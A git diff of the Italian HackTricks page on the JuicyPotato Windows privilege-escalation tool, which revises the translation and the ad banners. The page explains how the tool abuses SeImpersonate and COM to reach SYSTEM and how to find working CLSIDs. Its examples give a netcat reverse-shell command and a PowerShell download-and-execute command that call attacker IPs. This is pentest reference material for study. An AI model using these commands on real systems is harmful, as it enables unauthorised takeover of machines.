@@ -1,24 +1,27 @@
 # JuicyPotato
 
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Esperto Red Team AWS di HackTricks)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la **tua azienda pubblicizzata su HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Scopri [**La Famiglia PEASS**](https://opensea.io/collection/the-peass-family), la nostra collezione di esclusive [**NFT**](https://opensea.io/collection/the-peass-family)
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo di hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo di hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 ### [WhiteIntel](https://whiteintel.io)
 
 <figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.
+[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark-web** che offre funzionalità **gratuite** per controllare se un'azienda o i suoi clienti sono stati **compromessi** da **malware rubatori**.
 
-Il loro obiettivo principale di WhiteIntel è combattere i takeover di account e gli attacchi ransomware derivanti da malware che rubano informazioni.
+Il loro obiettivo principale di WhiteIntel è combattere il takeover degli account e gli attacchi ransomware derivanti da malware che rubano informazioni.
 
 Puoi controllare il loro sito web e provare il loro motore **gratuitamente** su:
 
@@ -27,54 +30,55 @@ Puoi controllare il loro sito web e provare il loro motore **gratuitamente** su:
 ***
 
 {% hint style="warning" %}
-**JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 in poi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) possono essere utilizzati per **sfruttare gli stessi privilegi e ottenere accesso di livello `NT AUTHORITY\SYSTEM`**. _**Controlla:**_
+**JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 e successivi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) possono essere utilizzati per **sfruttare gli stessi privilegi e ottenere accesso a livello `NT AUTHORITY\SYSTEM`**. _**Controlla:**_
 {% endhint %}
 
 {% content-ref url="roguepotato-and-printspoofer.md" %}
 [roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
 {% endcontent-ref %}
 
-## Juicy Potato (sfruttando i privilegi dorati) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
+## Juicy Potato (abusing the golden privileges) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_Una versione zuccherata di_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un po' di succo, ovvero **un altro strumento di Escalation dei Privilegi Locali, da Account Servizio Windows a NT AUTHORITY\SYSTEM**_
+_Versione zuccherata di_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, con un po' di succo, cioè **un altro strumento di escalation dei privilegi locali, da un Windows Service Accounts a NT AUTHORITY\SYSTEM**_
 
 #### Puoi scaricare juicypotato da [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)
 
-### Riassunto <a href="#summary" id="summary"></a>
+### Summary <a href="#summary" id="summary"></a>
 
 [**Dal Readme di juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e le sue [varianti](https://github.com/decoder-it/lonelypotato) sfruttano la catena di escalation dei privilegi basata sul servizio [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) avendo il listener MiTM su `127.0.0.1:6666` e quando si hanno i privilegi `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisione della build di Windows abbiamo trovato una configurazione in cui `BITS` era intenzionalmente disabilitato e la porta `6666` era occupata.
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) e le sue [varianti](https://github.com/decoder-it/lonelypotato) sfruttano la catena di escalation dei privilegi basata sul [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [servizio](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) avendo il listener MiTM su `127.0.0.1:6666` e quando hai privilegi `SeImpersonate` o `SeAssignPrimaryToken`. Durante una revisione della build di Windows abbiamo trovato una configurazione in cui `BITS` era intenzionalmente disabilitato e la porta `6666` era occupata.
 
-Abbiamo deciso di rendere armaiolo [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Diamo il benvenuto a Juicy Potato**.
+Abbiamo deciso di armare [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Dì ciao a Juicy Potato**.
 
-> Per la teoria, vedi [Rotten Potato - Escalation dei Privilegi da Account Servizio a SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e segui la catena di link e riferimenti.
+> Per la teoria, vedi [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) e segui la catena di link e riferimenti.
 
-Abbiamo scoperto che, oltre a `BITS`, ci sono diversi server COM che possiamo abusare. Devono solo:
+Abbiamo scoperto che, oltre a `BITS`, ci sono diversi server COM che possiamo sfruttare. Devono solo:
 
-1. essere istanziabili dall'utente corrente, di solito un "utente di servizio" che ha privilegi di impersonificazione
+1. essere istanziabili dall'utente corrente, normalmente un "utente di servizio" che ha privilegi di impersonificazione
 2. implementare l'interfaccia `IMarshal`
-3. essere eseguiti come utente elevato (SYSTEM, Amministratore, ...)
+3. essere eseguiti come un utente elevato (SYSTEM, Amministratore, …)
 
-Dopo alcuni test abbiamo ottenuto e testato un'ampia lista di [CLSID interessanti](http://ohpe.it/juicy-potato/CLSID/) su diverse versioni di Windows.
+Dopo alcuni test abbiamo ottenuto e testato un elenco esteso di [CLSID interessanti](http://ohpe.it/juicy-potato/CLSID/) su diverse versioni di Windows.
 
-### Dettagli succulenti <a href="#juicy-details" id="juicy-details"></a>
+### Juicy details <a href="#juicy-details" id="juicy-details"></a>
 
 JuicyPotato ti consente di:
 
 * **Target CLSID** _scegli qualsiasi CLSID tu voglia._ [_Qui_](http://ohpe.it/juicy-potato/CLSID/) _puoi trovare l'elenco organizzato per OS._
-* **Porta di ascolto COM** _definisci la porta di ascolto COM che preferisci (anziché il 6666 codificato in modo rigido)_
-* **Indirizzo IP di ascolto COM** _vincola il server su qualsiasi IP_
-* **Modalità di creazione del processo** _a seconda dei privilegi dell'utente impersonato puoi scegliere tra:_
-* `CreateProcessWithToken` (necessita di `SeImpersonate`)
-* `CreateProcessAsUser` (necessita di `SeAssignPrimaryToken`)
+* **COM Listening port** _definisci la porta di ascolto COM che preferisci (anziché il 6666 hardcoded)_
+* **COM Listening IP address** _collega il server a qualsiasi IP_
+* **Process creation mode** _a seconda dei privilegi dell'utente impersonato puoi scegliere tra:_
+* `CreateProcessWithToken` (richiede `SeImpersonate`)
+* `CreateProcessAsUser` (richiede `SeAssignPrimaryToken`)
 * `entrambi`
-* **Processo da avviare** _avvia un eseguibile o script se l'exploit ha successo_
-* **Argomento del processo** _personalizza gli argomenti del processo avviato_
-* **Indirizzo del server RPC** _per un approccio stealthy puoi autenticarti a un server RPC esterno_
-* **Porta del server RPC** _utile se vuoi autenticarti a un server esterno e il firewall blocca la porta `135`..._
-* **Modalità TEST** _principalmente per scopi di test, cioè testare i CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_qui per il testing_](http://ohpe.it/juicy-potato/Test/)
-### Utilizzo <a href="#usage" id="usage"></a>
+* **Process to launch** _lancia un eseguibile o uno script se lo sfruttamento ha successo_
+* **Process Argument** _personalizza gli argomenti del processo lanciato_
+* **RPC Server address** _per un approccio furtivo puoi autenticarti a un server RPC esterno_
+* **RPC Server port** _utile se vuoi autenticarti a un server esterno e il firewall blocca la porta `135`…_
+* **TEST mode** _principalmente per scopi di test, cioè testare i CLSID. Crea il DCOM e stampa l'utente del token. Vedi_ [_qui per il test_](http://ohpe.it/juicy-potato/Test/)
+
+### Usage <a href="#usage" id="usage"></a>
 ```
 T:\>JuicyPotato.exe
 JuicyPotato v0.1
@@ -95,19 +99,19 @@ Optional args:
 
 [**Dal Readme di juicy-potato**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
 
-Se l'utente ha i privilegi `SeImpersonate` o `SeAssignPrimaryToken` allora sei **SYSTEM**.
+Se l'utente ha i privilegi `SeImpersonate` o `SeAssignPrimaryToken`, allora sei **SYSTEM**.
 
-È quasi impossibile prevenire l'abuso di tutti questi Server COM. Potresti pensare di modificare i permessi di questi oggetti tramite `DCOMCNFG` ma buona fortuna, sarà una sfida.
+È quasi impossibile prevenire l'abuso di tutti questi server COM. Potresti pensare di modificare i permessi di questi oggetti tramite `DCOMCNFG`, ma buona fortuna, sarà una sfida.
 
-La soluzione effettiva è proteggere gli account sensibili e le applicazioni che vengono eseguite con gli account `* SERVICE`. Fermare `DCOM` certamente inibirà questo exploit ma potrebbe avere un impatto serio sul sistema operativo sottostante.
+La soluzione reale è proteggere gli account e le applicazioni sensibili che vengono eseguiti sotto gli account `* SERVICE`. Fermare `DCOM` inibirebbe certamente questo exploit, ma potrebbe avere un impatto serio sul sistema operativo sottostante.
 
 Da: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
 
 ## Esempi
 
-Nota: Visita [questa pagina](https://ohpe.it/juicy-potato/CLSID/) per una lista di CLSID da provare.
+Nota: Visita [questa pagina](https://ohpe.it/juicy-potato/CLSID/) per un elenco di CLSID da provare.
 
-### Ottenere una shell inversa con nc.exe
+### Ottieni una shell inversa nc.exe
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -120,7 +124,7 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 
 c:\Users\Public>
 ```
-### PowerShell rev
+### Powershell rev
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
@@ -130,19 +134,19 @@ c:\Users\Public>
 
 ## Problemi con CLSID
 
-Spesso, il CLSID predefinito utilizzato da JuicyPotato **non funziona** e l'exploit fallisce. Di solito, sono necessari diversi tentativi per trovare un **CLSID funzionante**. Per ottenere un elenco di CLSID da provare per un sistema operativo specifico, dovresti visitare questa pagina:
+Spesso, il CLSID predefinito che JuicyPotato utilizza **non funziona** e l'exploit fallisce. Di solito, ci vogliono più tentativi per trovare un **CLSID funzionante**. Per ottenere un elenco di CLSID da provare per un sistema operativo specifico, dovresti visitare questa pagina:
 
 {% embed url="https://ohpe.it/juicy-potato/CLSID/" %}
 
-### **Verifica dei CLSID**
+### **Controllo dei CLSID**
 
-Innanzitutto, avrai bisogno di alcuni eseguibili diversi da juicypotato.exe.
+Prima, avrai bisogno di alcuni eseguibili oltre a juicypotato.exe.
 
-Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricalo nella tua sessione PS, scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Quello script creerà un elenco di possibili CLSID da testare.
+Scarica [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) e caricalo nella tua sessione PS, e scarica ed esegui [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Quel script creerà un elenco di possibili CLSID da testare.
 
-Successivamente scarica [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(cambia il percorso dell'elenco CLSID e dell'eseguibile juicypotato) ed eseguilo. Inizierà a provare ogni CLSID e **quando il numero di porta cambierà, significherà che il CLSID ha funzionato**.
+Poi scarica [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(cambia il percorso per l'elenco CLSID e per l'eseguibile juicypotato) ed eseguilo. Inizierà a provare ogni CLSID, e **quando il numero di porta cambia, significherà che il CLSID ha funzionato**.
 
-**Verifica** i CLSID funzionanti **utilizzando il parametro -c**
+**Controlla** i CLSID funzionanti **utilizzando il parametro -c**
 
 ## Riferimenti
 
@@ -152,22 +156,25 @@ Successivamente scarica [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/
 
 <figure><img src="../../.gitbook/assets/image (1227).png" alt=""><figcaption></figcaption></figure>
 
-[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark web** che offre funzionalità **gratuite** per verificare se un'azienda o i suoi clienti sono stati **compromessi** da **malware ruba-informazioni**.
+[**WhiteIntel**](https://whiteintel.io) è un motore di ricerca alimentato dal **dark-web** che offre funzionalità **gratuite** per controllare se un'azienda o i suoi clienti sono stati **compromessi** da **malware rubatori**.
 
-Il loro obiettivo principale è contrastare le violazioni degli account e gli attacchi ransomware derivanti da malware che rubano informazioni.
+Il loro obiettivo principale di WhiteIntel è combattere il furto di account e gli attacchi ransomware derivanti da malware che rubano informazioni.
 
-Puoi visitare il loro sito web e provare il loro motore **gratuitamente** su:
+Puoi controllare il loro sito web e provare il loro motore **gratuitamente** su:
 
 {% embed url="https://whiteintel.io" %}
 
+{% hint style="success" %}
+Impara e pratica Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Impara e pratica Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Impara l'hacking di AWS da zero a eroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Supporta HackTricks</summary>
 
-* Lavori in una **azienda di sicurezza informatica**? Vuoi vedere la tua **azienda pubblicizzata in HackTricks**? o vuoi avere accesso all'**ultima versione del PEASS o scaricare HackTricks in PDF**? Controlla i [**PIANI DI ABBONAMENTO**](https://github.com/sponsors/carlospolop)!
-* Scopri [**The PEASS Family**](https://opensea.io/collection/the-peass-family), la nostra collezione esclusiva di [**NFT**](https://opensea.io/collection/the-peass-family)
-* Ottieni il [**merchandising ufficiale di PEASS & HackTricks**](https://peass.creator-spring.com)
-* **Unisciti al** [**💬**](https://emojipedia.org/speech-balloon/) [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguimi** su **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Condividi i tuoi trucchi di hacking inviando PR al** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **e al** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Controlla i [**piani di abbonamento**](https://github.com/sponsors/carlospolop)!
+* **Unisciti al** 💬 [**gruppo Discord**](https://discord.gg/hRep4RUj7f) o al [**gruppo telegram**](https://t.me/peass) o **seguici** su **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Condividi trucchi di hacking inviando PR ai** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos su github.
 
 </details>
+{% endhint %}
